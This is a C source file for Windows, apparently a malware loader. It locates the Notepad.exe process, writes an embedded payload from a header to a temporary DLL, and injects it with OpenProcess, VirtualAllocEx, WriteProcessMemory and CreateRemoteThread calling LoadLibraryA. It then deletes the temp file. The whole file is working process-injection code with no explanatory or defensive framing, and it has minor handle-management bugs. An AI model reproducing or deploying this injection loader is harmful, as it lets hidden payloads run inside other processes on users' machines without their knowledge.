#include "loader.h"
#include "payload.h"

void log(const char *fmt, ...) {
  va_list args;
  va_start(args, fmt);
  printf("\033[1;34m[LOG]\033[0m ");
  vprintf(fmt, args);
  printf("\n");
  va_end(args);
}

DWORD get_process_id(const char *processName) {
  HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

  PROCESSENTRY32 pe32 = {0};
  pe32.dwSize = sizeof(PROCESSENTRY32);

  if (!Process32First(hSnap, &pe32))
    return 0;

  do {
    if (strcmp(pe32.szExeFile, processName) == 0)
      break;
  } while (Process32Next(hSnap, &pe32));

  CloseHandle(hSnap);

  return pe32.th32ProcessID;
}

int try_inject() {
  DWORD processId = get_process_id("Notepad.exe");

  if (!processId) {
    log("Couldn't find process.");
    return 0;
  }

  char tempPath[MAX_PATH];
  char tempFile[MAX_PATH];

  GetTempPath(MAX_PATH, tempPath);
  GetTempFileName(tempPath, "dll", 0, tempFile);

  HANDLE hFile = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

  log("Temp DLL: %s", tempFile);

  WriteFile(hFile, payload, sizeof(payload), NULL, NULL);
  CloseHandle(hFile);

  HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
  void *file = VirtualAllocEx(hProc, NULL, strlen(tempFile) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  log("Allocation: 0x%X", file);

  WriteProcessMemory(hProc, file, tempFile, strlen(tempFile) + 1, NULL);

  FARPROC load = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

  HANDLE thread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)load, file, 0, NULL);

  WaitForSingleObject(thread, INFINITE);

  CloseHandle(hProc);
  CloseHandle(thread);

  VirtualFreeEx(hProc, file, strlen(tempFile) + 1, MEM_FREE);

  DeleteFile(tempFile);

  log("Successfully injected.");

  return 1;
}